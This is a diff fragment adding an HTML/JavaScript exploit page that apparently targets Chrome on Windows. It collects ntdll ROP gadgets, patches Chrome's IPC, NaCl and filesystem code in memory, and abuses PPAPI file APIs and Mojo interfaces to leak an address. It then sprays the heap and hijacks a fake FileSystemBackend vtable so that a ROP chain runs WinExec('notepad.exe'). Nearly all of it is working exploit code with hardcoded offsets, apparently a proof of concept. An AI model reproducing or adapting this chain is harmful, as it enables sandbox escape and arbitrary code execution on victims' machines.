+      0x41, 0x5a,             // pop r10
+      0x41, 0x5b,             // pop r11
+      0xc3                    // ret
+    ]);
+  ret_gadget_ptr = pop_gadget_ptr + 11n;
+  print('    [-] gadget2:            0x' + pop_gadget_ptr.toString(16));
+
+  mov_rcx_rax_gadget_ptr = ntdll.getGadget([
+      0x48, 0x8b, 0xc8,       // mov rcx, rax
+      0x48, 0x8b, 0xc1,       // mov rax, rcx
+      0x48, 0x83, 0xc4, 0x28, // add rsp, 28h
+      0xc3                    // ret
+    ])
+  // print('    [-] mov_rcx_rax_gadget:      0x' + mov_rcx_rax_gadget_ptr.toString(16));
+
+  jmp_rax_gadget_ptr = ntdll.getGadget([
+      0xff, 0xe0              // jmp rax
+    ])
+   print('    [-] gadget3:            0x' + jmp_rax_gadget_ptr.toString(16));
+}
+
+function patchIPC(rce, ipc_vmmap){
+  ipc_vmmap_leak_addr = ipc_vmmap + 0x400n
+  ipc_vmmap_junk = ipc_vmmap + 0x408n
+
+  rce.setBytes(ipc_patch, prepareBytes([
+      0x48, 0xBB, I64ToBytes(ipc_vmmap), // moveabs rbx, fs_patch
+      0xFF, 0xE3, // jmp rbx
+      0x48, 0x31, 0xDB, // xor rbx,rbx
+      0x90, 0x90, 0x90, 0x48, 0x89 //nop
+  ]));
+  rce.setBytes(ipc_vmmap, prepareBytes([
+      0x48, 0x8B, 0x44, 0x24, 0x28, // mov rax,qword ptr [rsp+28h]
+      0x81, 0x78, 0x08, 0x29, 0x06, 0x0A, 0x00, // cmp dword ptr [rax+8],0A0621h
+      0x75, 0x29, //jne label 1
+      0x48, 0xBA, I64ToBytes(ipc_vmmap_leak_addr), // moveabs rdx, ipc_vmmap_leak_addr
+      0x49, 0xB8, I64ToBytes(ipc_vmmap_junk), // moveabs r8, ipc_vmmap_junk
+      0x48, 0x8D, 0x4C, 0x24, 0x20, // lea     rcx,[rsp+20h]
+      0x48, 0xB8, I64ToBytes(UnpackMessage_func), // moveabs rax, fs_patch
+      0xFF, 0xD0, // call rax
+      0x84, 0xC0, // test    al,al
+      0x74, 0x25, // je label 2
+
+      0x48, 0xB8, I64ToBytes(Get_func), // moveabs rax, fs_patch  <= label 1
+      0xFF, 0xD0, // call rax
+      0x48, 0x8B, 0x10, // mov rdx,qword ptr [rax]
+      0x48, 0x89, 0xC1, // mov rcx,rax
+      0xFF, 0x52, 0x08, // call qword ptr [rdx+8]
+      0x8B, 0x54, 0x24, 0x60, // mov edx,dword ptr [rsp+60h]
+
+      0x48, 0xBB, I64ToBytes(ipccode_ptr1), // moveabs rbx, fs_patch
+      0xFF, 0xE3, // jmp rbx
+      0x48, 0xBB, I64ToBytes(ipccode_ptr2), // moveabs rbx, fs_patch  <= label 2
+      0xFF, 0xE3, // jmp rbx
+  ]));
+}
+
+function patchNacl(rce){
+  rce.setBytes(nacl_patch, prepareBytes([
+      0x90, 0x90, 0x90, // nop
+      0x48,  // padding
+  ]));
+}
+
+function patchFS(rce, fs_vmmap){
+    rce.setBytes(fs_patch, prepareBytes([
+        0x48, 0xBB, I64ToBytes(fs_vmmap), // moveabs rbx, fs_vmmap
+        0xFF, 0xE3, // jmp rbx
+        0x90, 0xBF, 0xFE, 0xFF //nop
+    ]));
+    rce.setBytes(fs_vmmap, prepareBytes([
+        0x48, 0x31, 0xE0, // xor rax,rsp
+        0x48, 0x89, 0x44, 0x24, 0x78,  // mov qword ptr [rsp+78h],rax
+        0x48, 0x89, 0x54, 0x24, 0x68, // mov qword ptr [rsp+68h],rdx
+        // 0x48, 0x89, 0xCF, 0x90, // mov rdi, rcx
+        // 0x48, 0x83, 0xc7, 0xa0, // add rdi,0FFFFFFFFFFFFFFA0h
+        0x48, 0x8D, 0x79, 0xA0, // lea rdi,[rcx-60h]
+        0x48, 0x81, 0xFA, 0x37, 0x13, 0x00, 0x00, // cmp rdx,1337h
+        0x75, 0x4B, //jne label 1
+        0x48, 0x8D, 0x5C, 0x24, 0x28, // lea rbx,[rsp+28h]
+        0x48, 0x89, 0xD9, // mov rcx,rbx
+        0xBA, 0xFF, 0xFF, 0xFF, 0x7F, // mov edx,7FFFFFFFh
+        0x48, 0xB8, I64ToBytes(MessageT_func), // moveabs rax, fs_patch
+        0xFF, 0xD0, // call rax
+        0x48, 0x89, 0xF9, // mov rcx, rdi
+        0xBA, 0x01, 0x00, 0x00, 0x00, // mov edx,1
+        0x49, 0x89, 0xD8, // mov r8,rbx
+        0x48, 0xB8, I64ToBytes(SendCreate_func), // moveabs rax, fs_patch
+        0xFF, 0xD0, // call rax
+        0x48, 0x89, 0xD9, // mov rcx,rbx
+        0x48, 0xB8, I64ToBytes(DMessage_func), // moveabs rax, fs_patch
+        0xFF, 0xD0, // call rax
+        0x48, 0xBB, I64ToBytes(fscode_ptr2), // moveabs rbx, fs_patch
+        0xFF, 0xE3, // jmp rbx
+        0x48, 0xBB, I64ToBytes(fscode_ptr1), // moveabs rbx, fs_patch <=  label 1
+        0xFF, 0xE3, // jmp rbx
+        0x90//, 0x90, 0x90 //nop
+    ]));
+}
+
+async function doPatch(rce){
+  print("[0] patch");
+  await find_libraries(rce);
+// 00007ffa`fbcc0000
+// 00007ff8`08d00000
+  ipc_patch = CHROME_BASE + 0x534AA52n;// 00007ff8`0e04aa52
+  ipccode_ptr1 = CHROME_BASE + 0x534AA64n;// 00007ff8`0e04aa64   mov rcx,rax
+  ipccode_ptr2 = CHROME_BASE + 0x534AA8Cn;// 00007ff8`0e04aa8c   xor esi,esi
+  Get_func = CHROME_BASE + 0x32E06B0n;// 00007ff8`0bfe06b0
+  UnpackMessage_func = CHROME_BASE + 0x10A5ED0n;// 00007ff8`09da5ed0
+
+  nacl_patch = CHROME_BASE + 0x366F1E3n;//00007ff8`0c36f1e3 // mov     r14d,eax
+
+  fs_patch = CHROME_BASE + 0x52A0ACCn;// 00007ff8`0dfa0acc // xor rax,rsp
+  fscode_ptr1 = CHROME_BASE + 0x52A0AD9n;// 00007ff8`0dfa0ad9 // mov edi,0FFFFFFFEh
+  fscode_ptr2 = CHROME_BASE + 0x52A0C2An;// 00007ff8`0dfa0c2a // Open+0x17a
+  MessageT_func = CHROME_BASE + 0x10AFE80n;// 00007ff8`09dafe80 u `file_io_resource.cc:116` `chrome!IPC::MessageT<PpapiHostMsg_FileIO_Create_Meta,std::__1::tuple<>,void>::MessageT
+  SendCreate_func = CHROME_BASE + 0x3FDE2F0n;// 00007ff8`0ccde2f0  chrome!ppapi::proxy::PluginResource::SendCreate
+  DMessage_func = CHROME_BASE + 0x3A2100n; // 00007ff8`090a2100 chrome!IPC::Message::~Message(void)
+  let mapAddr2 = showMeARWMap(rce)+0x500n;
+  LEAK_ADDR = mapAddr2 + 0x400n;
+  rce.write64(LEAK_ADDR, 0n);
+  RWXTheMemory(rce, CHROME_BASE, CHROME_DLL_LEN, mapAddr2 + 0x450n);
+
+  patchIPC(rce, mapAddr2);
+  patchNacl(rce);
+  patchFS(rce, mapAddr2 + 0x200n);
+  // print("DO_PATCH");
+
+  let plugin = document.createElement("embed");
+  plugin.src = "data:application/x-nacl,";
+  document.body.appendChild(plugin);
+}
+
+// Stage 1 : init
+async function init(rce){
+  print('[2] init');
+  
+  FILE_IO_API = CHROME_BASE + 0x7A62AD8n;// 00007ff8`10762ad8 // u `ppb_file_io_thunk.cc:147`
+  FILE_REF_API = FILE_IO_API + 0x1b8n;
+  FILE_SYSTEM_API = FILE_IO_API + 0x430n;
+  hostGlobals = CHROME_BASE + 0x8C24AD8n;// 00007ff8`11924ad8 // u `host_globals.cc:90`
+  CHROME_CHILD_CORE = CHROME_BASE + 0x8AB5B90n;// 00007ff8`117b5b90 // u `entrypoints.cc:29`
+
+  mapAddr1 = showMeARWMap(rce)+0x200n;
+  fileNameAddress = showMeAMap(rce);
+
+  retValueAddress = mapAddr1,
+  callbackStructAddress = mapAddr1 + 8n,
+  completionFlagAddress = mapAddr1 + 8n * 4n,
+  callbackAddress = mapAddr1 + 0x200n;
+
+  rce.setBytes(callbackStructAddress, prepareBytes([
+    I64ToBytes(callbackAddress), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+  ]));
+  rce.setBytes(callbackAddress, prepareBytes([
+    0x48, 0xB9, I64ToBytes(completionFlagAddress), // mov rcx, completionFlagAddress
+    0x48, 0xC7, 0x01, 0x01, 0x00, 0x00, 0x00, // mov qword ptr[rcx], 1
+    0xC3 // ret
+  ]));
+  apiTable = {
+    "FileSystem" :
+    {
+      "Create" : rce.read64(FILE_SYSTEM_API),//0x7fffe8a249a0
+      "Open" : rce.read64(FILE_SYSTEM_API+0x10n),
+      "GetType" : rce.read64(FILE_SYSTEM_API+0x18n),
+    },
+    "FileRef" :
+    {
+      "Create" : rce.read64(FILE_REF_API),
+      "Rename" : rce.read64(FILE_REF_API+0x48n),
+    },
+    "FileIO" :
+    {
+      "Create" : rce.read64(FILE_IO_API),
+      "Open" : rce.read64(FILE_IO_API+0x10n),
+      "SetLength" : rce.read64(FILE_IO_API+0x38n),
+      "Close" : rce.read64(FILE_IO_API+0x48n),
+    }
+  };
+  while(true){
+    instanceMapAddr = rce.read64(hostGlobals)+0x100n;
+    instanceAddr = rce.read64(instanceMapAddr);
+    instance = rce.read64(instanceAddr+0x20n);
+    // console.log(instance.toString(16));
+    if(instance == 1n){
+      await sleep(100);
+      continue;
+    }
+    break;
+  }
+  return 0;
+}
+
+// Stage 2 : leak
+function createFileSystem(){
+  print('[3] create');
+  var host_Origin = new url.mojom.Origin();
+  host_Origin.scheme = "http";
+  host_Origin.host = "192.168.50.100";
+  host_Origin.port = 52208;
+  var fileUrl2 = new url.mojom.Url();
+  let tmp_str = "filesystem:http://192.168.50.100:52208/temporary/"+"1/".repeat(dir_deepth);
+  let fs_manager_ptr = new blink.mojom.FileSystemManagerPtr();
+  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
+                    mojo.makeRequest(fs_manager_ptr).handle);
+  return fs_manager_ptr.open(host_Origin, blink.mojom.FileSystemType.kTemporary).then(result=>{
+    console.log(result);
+    fileUrl2.url = tmp_str;
+    return fs_manager_ptr.create(fileUrl2,true,true,true);
+    }).then(result => {
+      console.log(result);
+      fileUrl2.url = tmp_str+"x";
+      return fs_manager_ptr.create(fileUrl2,true,false,true);
+    }).then(result => {
+      console.log(result);
+      return result;
+  });
+}
+
+function createSSLError(){
+  var tmp = setInterval(()=>{
+    iframe.src = iframe.src;
+  },50);
+  setTimeout(()=>{
+    clearInterval(tmp);
+  },3000);
+}
+
+function leak(rce){
+
+  let fsResource,
+    fileRefResource,
+    fileIOResource;
+
+  return callApi(rce, "FileSystem", "Create", 0, instance, 3n).then(resource=>{
+    //console.log(resource);
+    fsResource = resource;
+    callApi(rce, "FileSystem", "Open", 1, fsResource, 1024n * 1024n);
+  }).then( _ => {
+    return callApi(rce, "FileRef", "Create", 0, fsResource, fileNameAddress);
+  }).then(async resource => {
+    // console.log(resource);
+    fileRefResource = resource;
+    return callApi(rce, "FileIO", "Create", 0, instance);
+  }).then(async resource => {
+    // console.log(resource)
+    fileIOResource = resource;
+    return callApi(rce, "FileIO", "Open", 2, fileIOResource, fileRefResource, 2n);
+  }).then(async _ => {
+    //console.log(_);
+    let t = await sleep(wait_time1);
+    callApi(rce, "FileSystem", "Open", 2, fsResource, 0x1337n);
+    createSSLError();
+    t = await sleep(wait_time2);
+  }).then(async _ =>{
+    // console.log("Done!");
+    leak_value = rce.read32(LEAK_ADDR);
+    // console.log(leak_value);
+    return leak_value;
+  });
+}
+
+// Stage 3 : build page
+function build_calc_stack(kCmdAddr){
+  let stack = new DataView(new ArrayBuffer(kStackSize));
+  let i = 0;
+
+  function push(value) {
+    stack.setBigUint64(i, value, true);
+    i += 8;
+  }
+
+  function call(fn_ptr, arg0=0x2323232323232323n, arg1=0x2323232323232323n, 
+      arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
+    push(pop_gadget_ptr);
+
+    push(0x233723372337n); // rax
+    push(arg1); // rdx
+    push(arg0); // rcx
+    push(arg2); // r8
+    push(arg3); // r9
+    push(0x2323232323232323n);
+    push(0x2323232323232323n);
+    push(fn_ptr);
+
+    // // leave scratch space
+    push(pop_gadget_ptr);
+    push(jmp_rax_gadget_ptr);
+    push(0x4141414141414141n);
+    push(0x4141414141414141n); // rcx
+    push(0x4141414141414141n);
+    push(0x4141414141414141n);
+    push(0x4141414141414141n);
+    push(0x4141414141414141n);
+  }
+  
+  call(
+    winexec_ptr, kCmdAddr, 5n);
+  push(
+    jmp_rax_gadget_ptr);
+
+  return stack;
+}
+
+function build_page(leakAddr) {
+  print('[5] build_page');
+  const kMapSprayPtr = BigInt((leakAddr + kSprayOffset)*0x100000000 + kSprayPtr);
+  
+  const kFileSystemOperationRunnerPtr = kMapSprayPtr;
+  const kFileSystemOperationNodePtr   = kMapSprayPtr + 0x100n;
+  const kFileSystemContextPtr         = kMapSprayPtr + 0x200n;
+  const kFileSystemBackendNodePtr     = kMapSprayPtr + 0x300n;
+  const kFileSystemBackendPtr         = kMapSprayPtr + 0x400n;
+  const kFileSystemBackendVtablePtr   = kMapSprayPtr + 0x500n;
+  const kStackPtr                     = kMapSprayPtr + 0x600n;
+  const kShellcodePtr                 = kMapSprayPtr + 0x800n;
+
+
+  let page = new DataView(new ArrayBuffer(0x1000));
+  let calcstack = build_calc_stack(kMapSprayPtr + 0x900n);
+
+  page.setBigUint64(0x008, kFileSystemContextPtr, true);
+  page.setBigUint64(0x018, kFileSystemOperationNodePtr, true);
+  page.setBigUint64(0x030, 0n, true);
+
+  page.setBigUint64(0x100, kFileSystemOperationNodePtr, true); // left
+  page.setBigUint64(0x108, kFileSystemOperationNodePtr, true); // parent
+  page.setBigUint64(0x110, kFileSystemOperationNodePtr, true); // right
+  page.setUint8(    0x118, 0);                                 // color
+  page.setUint8(    0x119, 1);                                 // isnil
+  page.setBigUint64(0x120, 0n, true);                          // key
+  page.setBigUint64(0x128, 0n, true);                          // value
+
+  page.setBigUint64(0x288, kFileSystemBackendNodePtr, true);
+
+  page.setBigUint64(0x300, 0n, true);         // left
+  page.setUint8(    0x318, 0);                                       // color
+  page.setUint8(    0x319, 0);                                       // isnil
+  page.setBigUint64(0x320, 0n, true);                                // key
+  page.setBigUint64(0x328, kFileSystemBackendPtr, true);                   
+
+  page.setBigUint64(0x400, kFileSystemBackendVtablePtr, true);
+  page.setBigUint64(0x410, kStackPtr, true);
+  page.setBigUint64(0x418, 0x133713371337n, true);
+  page.setBigUint64(0x450, ret_gadget_ptr, true);
+
+  page.setBigUint64(0x538, pivot_gadget_ptr, true);
+
+  for (var i = 0; i < calcstack.byteLength; ++i) {
+    page.setUint8(0x600 + i, calcstack.getUint8(i));
+  }
+
+  var cmd = "notepad.exe\0";
+  for (var i = 0; i < cmd.length; ++i){
+    page.setUint8(0x900 + i, cmd.charCodeAt(i));
+  }
+
+  return page;
+}
+
+// Stage 4 : heap spray
+function memswap(rce, src, dst, size){
+    var i = 0n;
+    while (size - i > 4n) {
+      var tmp = rce.read32(dst + i);
+      var tmp2 =rce.read32(src + i);
+      rce.write32(dst + i, tmp2);
+      rce.write32(src + i, tmp);
+      i += 4n;
+    }
+}
+
+function get_mojo_handle(rce, object) {
+  let object_ptr = rce.leakPtr(object) - 1n;
+  let object_handle_ptr = rce.read64(object_ptr + 0x14n);
+  let object_handle = rce.read32(object_handle_ptr + 0x10n);
+  return object_handle;
+}
+
+function spray(rce, page_data) {
+  print('[6] spray');
+
+  const kPageSize     = 0x1000;
+  const kHugePageSize = 0x40000000;
+
+  let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
+  let shared_memory_handle = get_mojo_handle(rce, shared_memory);
+  var page_view = new DataView(page_data);
+  for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
+    let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
+    let shared_view = new DataView(shared_buffer.buffer);
+    for (var j = 0; j < kPageSize; j += 4) {
+      shared_view.setUint32(j, page_view.getUint32(j));
+    }
+  }
+
+  let pipes = [];
+  let dupes = [];
+  let pipe_handles = new Set([]);
+  let dupe_handles = new Set([]);
+  force_gc();
+  for (var i = 0; i < kSprayPageNum; ++i) {
+    let pipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: 0x1000});
+    let dupe = shared_memory.duplicateBufferHandle();
+    let pipe_handle = get_mojo_handle(rce, pipe.consumer);
+    let dupe_handle = get_mojo_handle(rce, dupe.handle);
+
+    pipes.push(pipe);
+    dupes.push(dupe);
+    pipe_handles.add(pipe_handle);
+    dupe_handles.add(dupe_handle);
+  }
+    let mojo_core_ptr = rce.read64(CHROME_CHILD_CORE);
+    let mojo_handles_ptr = rce.read64(mojo_core_ptr + 0x20n);    
+
+    let pipe_dispatchers = [];
+    let dupe_dispatchers = [];
+
+    let list_node_ptr = rce.read64(mojo_handles_ptr + 0x18n);
+    
+    let list_length = rce.read32(mojo_handles_ptr + 0x20n);
+  for (var i = 0; i < list_length; ++i) {
+    let list_node_handle = rce.read32(list_node_ptr + 0x10n);
+    let list_node_dispatcher = rce.read64(list_node_ptr + 0x18n);
+    if (pipe_handles.has(list_node_handle)) {
+      pipe_dispatchers.push(list_node_dispatcher);
+    } else if (dupe_handles.has(list_node_handle)) {
+      dupe_dispatchers.push(list_node_dispatcher);
+    }
+    let tmp_list_node_ptr = rce.read64(list_node_ptr);
+    list_node_ptr = rce.read64(list_node_ptr);
+  }
+  for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
+    memswap(rce, pipe_dispatchers[i] + 0x80n,
+                dupe_dispatchers[i] + 0x20n,
+                0x28n);
+    rce.write32(pipe_dispatchers[i] + 0x18n, kHugePageSize);
+    rce.write32(pipe_dispatchers[i] + 0x1cn, kHugePageSize);
+  }
+
+  let ab = new ArrayBuffer(1);
+  for (var i = 0; i < pipes.length; ++i) {    
+    blob_registry_ptr2 = new blink.mojom.BlobRegistryPtr();
+    Mojo.bindInterface(blink.mojom.BlobRegistry.name,
+                     mojo.makeRequest(blob_registry_ptr2).handle, "process", true);
+    blob_registry_ptr2.registerFromStream("", "", 0x1, pipes[i].consumer, null);
+    pipes[i].producer.writeData(ab);
+  }
+  return () => {
+    let ab = new ArrayBuffer(0xfff);
+    for (var i = 0; i < pipes.length; ++i) {
+      pipes[i].producer.writeData(ab);
+    }
+    for (var i = 0; i < pipes.length; ++i) {
+      pipes[i].producer.close();
+    }
+    for (var i = 0; i < dupes.length; ++i) {
+      dupes[i].handle.close();
+    }
+  };
+}
+
+// Stage 5 : exploit
+function getAllocationConstructor() {
+  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
+                      mojo.makeRequest(blob_registry_ptr).handle, "process", true);
+
+  function Allocation(size) {
+      function ProgressClient(allocate) {
+          function ProgressClientImpl() {
+          }
+          ProgressClientImpl.prototype = {
+          onProgress: async (arg0) => {
+              if (this.allocate.writePromise) {
+              this.allocate.writePromise.resolve(arg0);
+              }
+          }
+          };
+          this.allocate = allocate;
+
+          this.ptr = new mojo.AssociatedInterfacePtrInfo();
+          var progress_client_req = mojo.makeRequest(this.ptr);
+          this.binding = new mojo.AssociatedBinding(
+          blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
+          );
+
+          return this;
+      };
+
+      this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
+      this.progressClient = new ProgressClient(this);
+      blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
+          this.serialized_blob = res.blob;
+      });
+
+      this.malloc = async function(data) {
+          promise = new Promise((resolve, reject) => {
+          this.writePromise = {resolve: resolve, reject: reject};
+          });
+          this.pipe.producer.writeData(data);
+          this.pipe.producer.close();
+          written = await promise;
+          console.assert(written == data.byteLength);
+      };
+
+      this.free = async function() {
+          this.serialized_blob.blob.ptr.reset();
+          await sleep(1000);
+      };
+
+      this.read = function(offset, length) {
+          this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
+          this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
+          return new Promise((resolve) => {
+          this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
+              result = new ArrayBuffer(length);
+              this.readpipe.consumer.readData(result);
+              this.watcher.cancel();
+              resolve(result);
+          });
+          });
+      };
+      this.readQword = async function(offset) {
+          let res = await this.read(offset, 8);
+          return (new DataView(res)).getBigUint64(0, true);
+      };
+      return this;
+  };
+
+  async function allocate(data) {
+      let allocation = new Allocation(data.byteLength);
+      await allocation.malloc(data);
+      return allocation;
+  };
+  return allocate;
+};
+
+allocate = getAllocationConstructor();
+
+function spray_blob(data, num=kSprayAllocationCount) {
+  return Promise.all(Array(num).fill().map(() => allocate(data)));
+};
+
+async function exploit(rce){
+  print('[7] exploit');
+  return callApi(rce, "FileSystem", "Create", 0, instance, 3n).then(resource=>{
+    //console.log(resource);
+    fsResource = resource;
+    return callApi(rce, "FileSystem", "Open", 1, fsResource, 1024n * 1024n);
+  }).then( _ => {
+    //console.log(_);
+    rce.setBytes(fileNameAddress,prepareBytes(stringToBytes(NOT_EXIST_FILE_NAME)));
+    return callApi(rce, "FileRef", "Create", 0, fsResource, fileNameAddress);
+  }).then(async resource => {
+    //console.log(resource);
+    fileRefResource = resource;
+    return callApi(rce, "FileIO", "Create", 0, instance);
+  }).then(async resource => {
+    //console.log(resource)
+    fileIOResource = resource;
+    return callApi(rce, "FileIO", "Open", 1, fileIOResource, fileRefResource, 0n);
+  }).then(async _ => {
+    //console.log(_);
+    let data = new ArrayBuffer(304);
+    let pdata = new DataView(data);
+    for (let i = 0; i < data.byteLength;i++){
+      pdata.setUint8(i,0x41);
+    }
+    // pdata.setBigUint64(0xd0,0x133713371337n,true);
+    pdata.setUint32(0xd4,leak_value + kSprayOffset,true);
+    pdata.setUint32(0xd0,kSprayPtr,true);
+
+    callApi(rce, "FileSystem", "Open", 2, fsResource, 0x1337n);
+
+    let heap = await spray_blob(data);
+
+    // console.log("Done!");
+    return callApi(rce, "FileIO", "Open", 1, fileIOResource, fileRefResource, 0n);
+  });
+}
+
+async function testFind(rce){
+  await doPatch(rce);
+  await init(rce);
+  await createFileSystem();
+  while(true){
+    leak_value = await leak(rce);
+    if(leak_value > 0x100 && leak_value != 0x7ffe){
+      break;
+    }
+  }
+  print('[4] leakDone ' + leak_value.toString(16) + '80000000');
+
+  let page = await build_page(leak_value);
+  cleanup2 = spray(rce, page.buffer);
+  cleanup2();
+  await exploit(rce);
+  print("test success");
+}
+</script>
+
+<!-- <button onclick="start()">Start</button> -->
+<pre id='log'></pre>
+</body>
+</html>
